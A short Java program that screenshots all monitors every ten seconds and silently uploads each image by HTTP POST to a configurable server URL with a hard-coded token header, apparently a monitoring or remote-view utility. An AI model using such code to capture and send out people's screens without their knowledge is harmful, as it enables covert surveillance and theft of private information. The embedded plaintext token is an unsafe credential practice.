import java.awt.AWTException;
import java.awt.GraphicsDevice;
import java.awt.GraphicsEnvironment;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import java.io.File;
import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Timer;
import java.util.TimerTask;

import javax.imageio.ImageIO;
class screenshots {
    static final String format = "png";
    static Robot robot;
    static Rectangle screenRect;
    public static void main(String[] args) {
        try {
            robot = new Robot();
            screenRect = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());

        } catch (AWTException e) {
            System.err.println(e);
        }
        Timer timer = new Timer();
        timer.schedule(new TimerTask() {
            String fn = "";
            public void run() {
                fn = takeScreenshot(fn);
                uploadScreenshot(fn);
            }
        }, 0, 10000);
    }
    public static String takeScreenshot(String old) {
        if (old != "") {
            File oldFile = new File(old);
            if (oldFile.exists()) {
                oldFile.delete();
            }
        }
        long unixTime = System.currentTimeMillis() / 1000L;
        String fileName = "screenshot_"+unixTime+"." + format;
        try {
            for (GraphicsDevice gd : GraphicsEnvironment.getLocalGraphicsEnvironment().getScreenDevices()) {
                screenRect = screenRect.union(gd.getDefaultConfiguration().getBounds());
            }
            BufferedImage screenFullImage = robot.createScreenCapture(screenRect);
            ImageIO.write(screenFullImage, format, new File(fileName));
        } catch (IOException e) {
            System.err.println(e);
            return e.getMessage();
        }
        return fileName;
    }
    public static void uploadScreenshot(String filePath) {
        try {
            File file = new File(filePath);
            String url = "http://localhost:8080/update"; // Replace with your server URL
            HttpURLConnection connection = (HttpURLConnection) new URL(url).openConnection();
            connection.setDoOutput(true);
            connection.setRequestMethod("POST");
            connection.setRequestProperty("Content-Type", "application/octet-stream");
            connection.setRequestProperty("X-TOD-Token", "Theod0r3!");
            connection.getOutputStream().write(java.nio.file.Files.readAllBytes(file.toPath()));
            connection.getOutputStream().flush();
            connection.getOutputStream().close();
            int responseCode = connection.getResponseCode();
            if (responseCode == HttpURLConnection.HTTP_OK) {
                // System.out.println("Screenshot uploaded successfully.");
            } else {
                // System.out.println("Failed to upload screenshot. Response code: " + responseCode);
            }
        } catch (IOException e) {
            System.err.println(e);
        }
    }
}